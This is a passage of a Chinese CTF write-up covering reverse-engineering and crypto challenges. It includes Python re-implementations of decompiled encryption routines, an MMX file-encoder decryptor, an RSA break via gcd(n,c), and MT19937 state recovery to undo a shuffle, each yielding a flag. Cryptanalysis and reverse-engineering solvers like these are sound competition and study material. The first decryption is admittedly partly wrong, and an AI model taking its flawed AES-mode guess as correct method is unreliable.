+    # was constructed as m128i_i64[0] and m128i_i64[1] with bytes 0..7 then 8..15).
+    out = bytes([b0, b1, b2, b3, b4, b5, b6, b7,
+                 b8, b9, b10, b11, b12, b13, b14, b15])
+    return out
+
+a0 = 0xDEADBEEF
+a1 = 0xCAFEBABE
+val = compute_xmmword_849860(a0, a1)
+print("xmmword_849860 (hex):", val.hex())
+```
+
+分析感觉是cbc模式，但解密没法正常padding，只好no padding得到第一层解密后的数据
+
+```Plain
+54f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979010203040500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005d72b88b6a41daad8d691e1d09253dd3c
+```
+
+接着aes出来后，看到下方多处运算，分析可知用0xCAFEBABEDEADBEEFLL初始化了密钥，同样同构下拿到96字节密钥
+
+```Python
+import struct
+
+def rol8(x, n):
+    x &= 0xFF
+    n %= 8
+    return ((x << n) | (x >> (8 - n))) & 0xFF
+
+def compute_a2_from_a1(a1):
+    """
+    a1: iterable with at least two 32-bit unsigned ints [a1[0], a1[1], ...]
+    returns: bytearray of length 128 representing the memory region written by sub_404B70
+    """
+    if len(a1) < 2:
+        raise ValueError("a1 must have at least two elements")
+    a1_0 = int(a1[0]) & 0xFFFFFFFF
+    a1_1 = int(a1[1]) & 0xFFFFFFFF
+
+    a2 = bytearray(128)  # allocate enough space
+
+    # write a2[5].m128i_i64[0] = *(_QWORD *)a1  -> offset 5*16 = 80, write 8 bytes little-endian (a1[0], a1[1])
+    struct.pack_into("<II", a2, 5 * 16, a1_0, a1_1)
+
+    # --- first loop: fill bytes 0..31 ---
+    v3 = 0
+    for i in range(32):
+        key_val = (a1[i & 1] & 0xFFFFFFFF)
+        shift = (3 * i) & 0x1F    # x86 shifts mask to 5 bits
+        shifted = (key_val >> shift) & 0xFFFFFFFF if shift < 32 else 0
+        v5 = (v3 + shifted) & 0xFFFFFFFF
+        v3 = (v3 + 17) & 0xFFFFFFFF
+        val = (v5 ^ 0x37) & 0xFF
+        a2[i] = rol8(val, 4)
+
+    # --- second loop: fill bytes 32..63 ---
+    for j in range(32):
+        key_val = (a1[((j + 1) & 1)] & 0xFFFFFFFF)
+        shift = (2 * j) & 0x1F
+        shifted = (key_val >> shift) & 0xFFFFFFFF if shift < 32 else 0
+        val32 = (j ^ shifted) & 0xFFFFFFFF
+        val_sub = (val32 - 85) & 0xFFFFFFFF
+        val_byte = val_sub & 0xFF
+        a2[32 + j] = rol8(val_byte, 2)
+
+    # --- result[5].m128i_i32[2] = 1  -> offset 5*16 + 8 = 88, write 4-byte little-endian 1 ---
+    struct.pack_into("<I", a2, 5 * 16 + 8, 1)
+
+    # --- construct v9 (16 bytes) and store into a2[4] (offset 64..79) ---
+    v7 = a1_0
+    v8 = a1_1
+
+    def byte_of(x):
+        return x & 0xFF
+
+    # We'll compute bytes b0..b15 according to the decompiled expressions.
+    b0  = byte_of(9 * ((v7 ^ v8)))
+    b1  = byte_of(9 * (((v7 >> 2) ^ (v8 >> 2))) + 1)
+    b2  = byte_of(9 * (((v8 >> 4) ^ (v7 >> 4))) + 2)
+    b3  = byte_of(9 * (((v8 >> 6) ^ (v7 >> 6))) + 3)
+    b4  = byte_of(9 * ((((v8 >> 8) & 0xFF) ^ ((v7 >> 8) & 0xFF))) + 4)
+    b5  = byte_of(9 * (((v8 >> 10) ^ (v7 >> 10))) + 5)
+    b6  = byte_of(9 * (((v8 >> 12) ^ (v7 >> 12))) + 6)
+    b7  = byte_of(9 * (((v8 >> 14) ^ (v7 >> 14))) + 7)
+
+    b8  = byte_of(9 * ((((v8 >> 16) & 0xFF) ^ ((v7 >> 16) & 0xFF))) + 8)
+    b9  = byte_of(9 * (((v8 >> 18) ^ (v7 >> 18))) + 9)
+    b10 = byte_of(9 * (((v8 >> 20) ^ (v7 >> 20))) + 10)
+    b11 = byte_of(9 * (((v8 >> 22) ^ (v7 >> 22))) + 11)
+    b12 = byte_of(9 * ((((v8 >> 24) & 0xFF) ^ ((v7 >> 24) & 0xFF))) + 12)
+    b13 = byte_of(9 * (((v8 >> 26) ^ (v7 >> 26))) + 13)
+    b14 = byte_of(9 * (((v8 >> 28) ^ (v7 >> 28))) + 14)
+    b15 = byte_of(9 * (((v8 >> 30) ^ (v7 >> 30))) + 15)
+
+    v9_bytes = bytes([b0, b1, b2, b3, b4, b5, b6, b7,
+                      b8, b9, b10, b11, b12, b13, b14, b15])
+
+    # store into a2[4] (offset 4*16 = 64)
+    a2[4*16 : 4*16 + 16] = v9_bytes
+
+    return a2
+
+# Example usage:
+if __name__ == "__main__":
+    a1 = [0xDEADBEEF, 0xCAFEBABE]
+    a2_bytes = compute_a2_from_a1(a1)
+    print("a2 (hex):", a2_bytes.hex())
+    # If you want to view each 16-byte lane like __m128i elements:
+    for i in range(6):
+        chunk = a2_bytes[i*16:(i+1)*16]
+        print(f"a2[{i}] = {chunk.hex()}")
+```
+
+接着就是最后加密的地方sub_4031F0
+
+![img](47.png)
+
+里面还是比较复杂的，第一眼以为没法逆向来着，观察到最后先乘以7再加13再异或0x53，ai分析可知7有逆元0xb7可逆，所以得开始想办法解密上面的aes明文
+
+![img](48.png)
+
+发现sub_403A50和sub_4031F0紧邻，里面正是逆向代码，还没被调用，出题人可能忘删了也可能故意留着。想着调试会更简单，但是不会发通信数据。所以直接疯狂拷打ai让他同构sub_403A50。其中a1是密文、a3是密钥、a2是a1长度、a4是0
+
+```Python
+# --- 辅助函数 (模拟 C 的 8 位循环移位) ---
+
+def ROR1(byte, bits):
+    """8位循环右移"""
+    byte &= 0xFF
+    return ((byte >> bits) | (byte << (8 - bits))) & 0xFF
+
+
+def ROL1(byte, bits):
+    """8位循环左移"""
+    byte &= 0xFF
+    return ((byte << bits) | (byte >> (8 - bits))) & 0xFF
+
+
+# --- 占位符函数 ---
+
+def sub_4031F0_placeholder(a1_buf, a2_len, a3_buf):
+    """
+    这是对 C 函数 sub_4031F0 的占位符。
+    如果 a4 != 0，则会调用此函数。
+    """
+    print(f"[!] 调用 sub_4031F0 (未实现)")
+    # 在此处实现 sub_4031F0 的逻辑
+    pass
+
+
+def sim_simd_block(a1_buf, start_index, end_index, a3_buf):
+    """
+    这是对 C 代码中 SSE/SIMD 块 (v18-v39) 的占位符。
+    这部分代码在 C 中用于高性能处理 128 字节的数据块。
+    要 1:1 翻译它，需要逆向工程其实现的具体加密算法。
+    """
+    print(f"[!] 调用 SIMD 块 (未实现) @ {start_index}-{end_index}")
+    # 在此处实现 SIMD 块的 *算法* 逻辑
+    pass
+
+
+# --- 核心逻辑的 Python 实现 ---
+
+def scalar_8byte_block_transform(a1_buf, start_index, end_index, a3_buf):
+    """
+    实现了 C 代码中的 v40 和 v46 循环（标量 8 字节块转换）。
+    它在 8 字节块上对索引 i 和 i+4 的字节进行 3 轮混淆。
+    """
+    # 从 a3 获取密钥
+    key_b = a3_buf[34]  # a3 + 34
+    key_c = a3_buf[33]  # a3 + 33
+    key_d = a3_buf[32]  # a3 + 32
+
+    # C 循环是 v6 < v15 (a2-7)，v6 每次+8
+    # 这等同于处理 0, 8, 16... 直到 (a2-8) & ~7
+    for i in range(start_index, end_index, 8):
+        # 对应 v41 = *v40
+        v41_b = a1_buf[i]
+
+        # --- 第 1 轮 ---
+        # v42 = *(v40 - 4) ^ ROL1(key_b + 3*v41, 1)
+        # *(v40 - 4) 对应 a1[i+4]
+        v42_b = a1_buf[i + 4] ^ ROL1((key_b + 3 * v41_b) & 0xFF, 1)
+        # *(v40 - 4) = v41
+        a1_buf[i + 4] = v41_b
+        # *(v40 - 8) = v42
+        a1_buf[i] = v42_b
+
+        # --- 第 2 轮 ---
+        # v44 = v41 ^ ROL1(key_c + 3*v42, 1)
+        v44_b = v41_b ^ ROL1((key_c + 3 * v42_b) & 0xFF, 1)
+        # *(v40 - 4) = v42
+        a1_buf[i + 4] = v42_b
+        # *(v40 - 8) = v44
+        a1_buf[i] = v44_b
+
+        # --- 第 3 轮 ---
+        # v45 = ROL1(key_d + 3*v44, 1)
+        v45_b = ROL1((key_d + 3 * v44_b) & 0xFF, 1)
+        # *(v40 - 4) = v44
+        a1_buf[i + 4] = v44_b
+        # *(v40 - 8) = v45 ^ v42
+        a1_buf[i] = (v45_b ^ v42_b) & 0xFF
+
+
+def sub_403A50_py(a1_buf: bytearray, a3_buf: bytes, a4: int):
+    """
+    C 函数 sub_403A50 的 Python 简化版。
+
+    :param a1_buf: 必须是 bytearray (可变缓冲区)
+    :param a3_buf: 必须是 bytes 或 bytearray (密钥/上下文)
+    :param a4: 标志位
+    """
+    a2_len = len(a1_buf)
+
+    # --- 1. `if (a4)` 分支 ---
+    if a4 != 0:
+        sub_4031F0_placeholder(a1_buf, a2_len, a3_buf)
+        return  # 函数结束
+
+    # --- 2. `else (a4 == 0)` 分支 ---
+    if a2_len > 0:
+
+        # --- 阶段 1：反向预处理循环 (v7, v9) ---
+        # C 代码的循环从 a2-1 向下遍历到 0
+        for i in range(a2_len - 1, -1, -1):
+            v9 = a1_buf[i]
+            ror_val = ROR1(v9, 3)
+            xor_val = ror_val ^ 0x5A
+            # (val - 13) * -73，最后截断为 8-bit
+            # Python 的 & 0xFF 模拟了 C 的 (char) 截断
+            sub_val = (xor_val - 13)
+            mul_val = (sub_val * -73) & 0xFF
+            a1_buf[i] = mul_val
+
+        # --- 阶段 2：核心转换循环 ---
+        if a2_len > 7:
+            # C 代码中，此循环处理 8 字节块，直到索引 < (a2 - 7)
+            # 最后一个块的起始索引是 (a2 - 8) & ~7
+            scalar_loop_end = (a2_len - 8) & ~7
+
+            # C 代码中的 SIMD 检查
+            # 我们只模拟 a2 > 135 的条件
+            if a2_len > 135:
+                # --- 情况 A：SIMD ---
+
+                # 计算 SIMD 会处理多少 128 字节的块
+                # (a2 - 8) >> 7 是 C 代码中的 simd_block_count
+                simd_end_index = ((a2_len - 8) >> 7) * 128
+
+                if simd_end_index > 0:
+                    # 调用 SIMD 占位符
+                    sim_simd_block(a1_buf, 0, simd_end_index, a3_buf)
+
+                # C 代码的 v40 循环，处理 SIMD 之后的剩余部分
+                scalar_start_index = simd_end_index
+            else:
+                # --- 情况 B：非 SIMD ---
+                # C 代码的 v46 循环，从头开始处理
+                scalar_start_index = 0
+
+            # 为情况 A（剩余部分）或情况 B（全部）运行标量循环
+            if scalar_start_index < scalar_loop_end:
+                scalar_8byte_block_transform(
+                    a1_buf, scalar_start_index, scalar_loop_end, a3_buf
+                )
+
+        # --- 阶段 3：正向后处理循环 (v12) ---
+
+        # v10 = *(_DWORD *)(a3 + 88)
+        v10 = int.from_bytes(a3_buf[88:92], 'little', signed=False)
+        # v11 = a3 + 64
+        v11_base_ptr = 64
+
+        for v12 in range(a2_len):
+            # v13 = ROR1(a1[v12], 2)
+            v13 = ROR1(a1_buf[v12], 2)
+
+            # v14 = a3[64 + (v12 & 0xF)] ^ v13
+            key1 = a3_buf[v11_base_ptr + (v12 & 0xF)]
+            v14 = key1 ^ v13
+
+            # key2_index = ((v10_low_byte + v12_low_byte) & 0x1F)
+            key2_index = ((v10 & 0xFF) + (v12 & 0xFF)) & 0x1F
+            key2 = a3_buf[key2_index]
+
+            # a1[v12] = v14 - key2 - v12
+            # 所有运算都隐式截断为 8 位
+            final_val = (v14 - key2 - (v12 & 0xFF)) & 0xFF
+            a1_buf[v12] = final_val
+    return bytes(a1_buf)
+
+
+if __name__ == "__main__":
+    a1_data = bytearray.fromhex("54f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979")  # 示例
+    a3_data = bytes.fromhex("8df5a27a8256629f1558a9d2d856a63ca87bb9f9651560b6167b74d71f5b2022a595518ea554627186354170c597b6de6555914e6594a231467581300657f61fd9b56f9c28ceb6b3f3bd77e4c03a170fefbeaddebebafeca0100000000000000")  # 示例，a3 必须足够长
+
+    print(f"处理前: {a1_data.hex()}")
+
+    # 假设 a4 = 0 (执行解密逻辑)
+    sub_403A50_py(a1_data, a3_data, 0)
+
+    print(f"处理后: {a1_data}")
+处理前: 54f6c590f050170247551cacc8be0265522a7853fe790fdd58f8556ad6cf0dda9f534c0db07b8e1d3f065f4e7f59e7db666d6629025a81faab149f70bccb6b67b7ea6b56ea3be73a04cf5c8b835e0391b6c0e22ef1e2269be74979
+处理后: bytearray(b'ENCRYPTED:flag{5f8fe0cbc7253ww_he11obambi}|SERVER:iked|TIME:1760252033|STATUS:SU\xe0CES\xfb|SEQ:0')
+```
+
+万幸后面的部分错误没影响到flag字符串，感觉还是aes那里模式选取有点问题，解密出来的明文可能不太对
+
+flag的值为flag{5f8fe0cbc7253ww_he11obambi}
+
+这是和gemini、gpt对话的过程
+
+- https://gemini.google.com/share/9857c7842a01
+- https://gemini.google.com/share/1eb7d5a528af
+- https://chatgpt.com/share/68f503a1-106c-8006-98a8-15248dc6ee10
+- https://chatgpt.com/share/68f503b1-8e20-8006-b780-5c1bd8380d8f
+
+## butterfly
+
+函数主逻辑如下:
+
+```C++
+__int64 __fastcall sub_4018D0(int n3, _QWORD *a2, __int64 a3, int a4, int a5, int a6)
+{
+
+  if ( n3 != 3 )
+  {
+    sub_4776D0(2, (unsigned int)"Usage: %s <input_file> <output_file>\n", *a2, a4, a5, a6, v40[0]);
+    sub_4776D0(2, (unsigned int)"Example: %s plaintext.txt encoded.dat\n", *a2, v6, v7, v8, v40[0]);
+    return 1;
+  }
+  v10 = a2[1];
+  v11 = a2[2];
+  v12 = sub_405540(v10, "rb");
+  v16 = v12;
+  if ( !v12 )
+  {
+    sub_4776D0(2, (unsigned int)"Error: Cannot open file %s\n", v10, v13, v14, v15, v40[0]);
+    return 1;
+  }
+  sub_407480(v12, 0, 2);
+  n7 = sub_405640(v16);
+  sub_407480(v16, 0, 0);
+  v18 = sub_412620(n7 + 8);
+  v19 = (__m64 *)v18;
+  if ( !v18 )
+  {
+    sub_405180(v16);
+    sub_4774A0("Error: Memory allocation failed");
+    return 1;
+  }
+  n7_1 = sub_41CC80(v18, n7 + 8, 1, n7, v16);
+  sub_405180(v16);
+  if ( n7 != n7_1 )
+  {
+    sub_412CF0(v19);
+    sub_4774A0("Error: File read failed");
+    return 1;
+  }
+  *(__int16 *)((char *)v19->m64_i16 + n7) = n7;
+  v24 = _mm_loadu_si128((const __m128i *)"MMXEncode2024");
+  v40[1] = v24.m128i_i64[1];
+  v41 = _mm_loadu_si128((const __m128i *)"coding file: %s\n");
+  sub_4776D0(2, (unsigned int)"Encoding file: %s\n", v10, v21, v22, v23, v24.m128i_i8[0]);
+  sub_4776D0(2, (unsigned int)"Original size: %zu bytes\n", n7, v25, v26, v27, v40[0]);
+  *(_QWORD *)v42 = v40[0];
+  if ( (int)n7 > 7 )
+  {
+    v28 = v19;
+    do
+    {
+      v29 = _m_pxor((__m64)v28->m64_u64, *(__m64 *)v42);
+      v30 = _m_por(_m_psrlwi(v29, 8u), _m_psllwi(v29, 8u));
+      v28->m64_u64 = (unsigned __int64)_m_paddb(_m_por(_m_psllqi(v30, 1u), _m_psrlqi(v30, 0x3Fu)), *(__m64 *)v42);
+      if ( &v19[(unsigned int)(n7 - 1) >> 3] == v28 )
+        break;
+      ++v28;
+    }
+    while ( &v19[((unsigned int)(n7 - 8) >> 3) + 1] != v28 );
+  }
+  _m_empty();
+  if ( (unsigned int)sub_401CA0(v11, v19, n7) )
+  {
+    sub_4776D0(2, (unsigned int)"Successfully encoded to: %s\n", v11, v31, v32, v33, v40[0]);
+    sub_4776D0(2, (unsigned int)"Encoded size: %zu bytes\n", n7, v34, v35, v36, v40[0]);
+    sub_4777A0((unsigned int)v42, 256, 2, 256, (unsigned int)"%s.key", v11, v40[0]);
+    if ( (unsigned int)sub_401CA0(v42, v40, 32) )
+      sub_4776D0(2, (unsigned int)"Key saved to: %s\n", (unsigned int)v42, v37, v38, v39, v40[0]);
+  }
+  sub_412CF0(v19);
+  return 0;
+}
+```
+
+就是用MMXEncode2024构造密钥生成了流密码去对于输入的文件进行了加密,然后保存到encode.data
+
+```Python
+# decrypt_keep_last4.py
+from binascii import unhexlify
+
+hex_input = "8F A3 9C B7 70 8D 8F 98 9D BF 8C 99 8C 73 E5 90 " \
+            "8D 8D 8C 85 88 79 85 7C 9D 9F 3C 53 16 15 19 12 " \
+            "36 37 7D 0A"
+hex_str = ''.join(hex_input.split())
+cipher = unhexlify(hex_str)
+
+K = b"MMXEncod"  # first 8 bytes of "MMXEncode2024"
+
+def rotr64(x, n=1):
+    return ((x >> n) | ((x & ((1 << n) - 1)) << (64 - n))) & ((1<<64)-1)
+
+def swap16_le(x):
+    out = 0
+    for i in range(4):
+        word = (x >> (16*i)) & 0xFFFF
+        swapped = ((word & 0xFF) << 8) | ((word >> 8) & 0xFF)
+        out |= (swapped << (16*i))
+    return out
+
+def decrypt_block(block_bytes, K):
+    b = bytearray(block_bytes.ljust(8, b'\x00'))
+    t3 = bytes(((b[i] - K[i]) & 0xFF) for i in range(8))
+    t3_int = int.from_bytes(t3, 'little')
+    t2_int = rotr64(t3_int, 1)
+    t_int = swap16_le(t2_int)
+    t_bytes = t_int.to_bytes(8, 'little')
+    p = bytes(t_bytes[i] ^ K[i] for i in range(8))
+    return p
+
+# keep last 4 bytes unchanged
+if len(cipher) < 4:
+    raise ValueError("cipher too short")
+keep = cipher[-4:]
+to_decrypt = cipher[:-4]
+
+pt = bytearray()
+for i in range(0, len(to_decrypt), 8):
+    block = to_decrypt[i:i+8]
+    dec = decrypt_block(block, K)
+    # for final partial block, keep only original length
+    pt.extend(dec[:len(block)])
+
+# final plaintext = decrypted_part + kept_footer
+final = bytes(pt) + keep
+
+print("Decrypted (hex):", final.hex())
+print("Decrypted (utf-8, errors=replace):", final.decode('utf-8', errors='replace'))
+```
+
+输出得到:
+
+```Plain
+Decrypted (hex): 666c61677b6275747465725f666c795f6d6d785f656e636f64655f373737383136377d0a
+Decrypted (utf-8, errors=replace): flag{butter_fly_mmx_encode_7778167}
+```
+
+flag 的值为: flag{butter_fly_mmx_encode_7778167}
+
+# Crypto
+
+## check-little
+
+RSA，给出的\$e=3\$，很小，但是直接对\$c\$直接开三次方根又不行，用工具分解\$n\$也不行，不过既然存在\$\varphi(n)\$不能被$$$$整除这一层条件，那么这道题的解法绝对是分解\$n\$，后面实在没辙了拿\$n\$跟给出来的参数一个个求 gcd，发现\$\gcd(n,c)\$居然不为\$1\$或者\$n\$，也就是说\$gcd(n,c)\$就是\$n\$的一个质因数，那么这样就可以分解\$n\$了
+
+```Python
+from Crypto.Util.number import *
+from Crypto.Cipher import AES
+from gmpy2 import iroot, gcd
+
+N = ...
+c = ...
+iv = b'\x91\x16\x04\xb9\xf0RJ\xdd\xf7}\x8cW\xe7n\x81\x8d'
+ct = bytes.fromhex("bf87027bc63e69d3096365703a6d47b559e0364b1605092b6473ecde6babeff2")
+
+e = 3
+p = gcd(N, c)
+q = N // p
+
+phi = (p - 1) * (q - 1)
+d = inverse(3, phi)
+key = pow(c, d, N)
+
+print(AES.new(long_to_bytes(key)[:16], AES.MODE_CBC, iv).decrypt(ct))
+```
+
+从flag也能看出\$ke\$能被\$p\$整除，很新奇的出题思路.
+
+## ezran
+
+很明显是基于2024年同济大学第二届网络安全新生赛CatCTF的Random game这道题改的，shuffle部分直接按照原题的方法打就行了，但是在此之前我们要先恢复MT19937的状态，对比两题源码可以看到本题将：
+
+```Python
+pow(getrandbits(4), 2*i, 17) & 0xf) ^ getrandbits(8)
+```
+
+改成了：
+
+```Python
+r1 = getrandbits(8)
+r2 = getrandbits(16)
+x=(pow(r1, 2*i, 257) & 0xff) ^ r2
+```
+
+并且只给了3108组这样的数据，就算我们只取所有\$x\$的高8位（也就是\$r_2\$的高8位）也是完全足以恢复 MT19937 的状态的（\$8\times 3108=24864>1993\$），但是直接改[原脚本](https://tangcuxiaojikuai.xyz/post/69eaef2e.html#more)跑要么就是Killed了，要么就是跑到半路卡死了，估计是电脑不太行，搞了半天想起来 maple 大佬写的那个 gf2bv，尝试依据原题的思路再加上 gf2bv 原来项目给出的例子改写了一下代码：
+
+```Python
+from Crypto.Util.number import *
+from gf2bv import *
+from gf2bv.crypto.mt import *
+from tqdm import *
+import sys
+sys.set_int_max_str_digits(114514)
+
+gift = "..."
+gift = int(gift)
+c = ")9Lsu_4s_eb__otEli_nhe_tes5gii5sT@omamkn__ari{efm0__rmu_nt(0Eu3_En_og5rfoh}nkeoToy_bthguuEh7___u"
+giftstr = long_to_bytes(gift)
+
+s = [giftstr[i: i+2] for i in range(0, len(giftstr), 2)]
+
+LS = LinearSystem([32] * 624)
+mt = LS.gens()
+RNG = MT19937(mt)
+
+tmp = []
+for i in trange(len(s)):
+    x = bytes_to_long(s[i])
+    r1 = RNG.getrandbits(8)
+    r2 = RNG.getrandbits(16)
+    if i % 64 == 0:
+        if (i >> 6) & 1  == 0:
+            tmp.append(r2 ^ (x ^ 1))
+        else:
+            tmp.append((r2 >> 1) ^ (x >> 1))
+    else:
+        tmp.append((r2 >> 8) ^ (x >> 8))
+
+tmp.append(mt[0] ^ 0x80000000)
+sol = LS.solve_all(tmp)
+
+# print(sol)
+
+for solve in sol:
+    mt19937 = MT19937(solve).to_python_random()
+    try:
+        for i in trange(3108):
+            r1 = mt19937.getrandbits(8)
+            r2 = mt19937.getrandbits(16)
+            assert (pow(r1, 2*i, 257) & 0xff) ^ r2 == bytes_to_long(s[i])
+
+        x = [i for i in range(len(c))]
+        for i in range(2025):
+            mt19937.shuffle(x)
+
+        flag = ""
+        for i in range(len(c)):
+            flag += c[x.index(i)]
+
+        print(flag)
+
+    except:
+        continue
+```
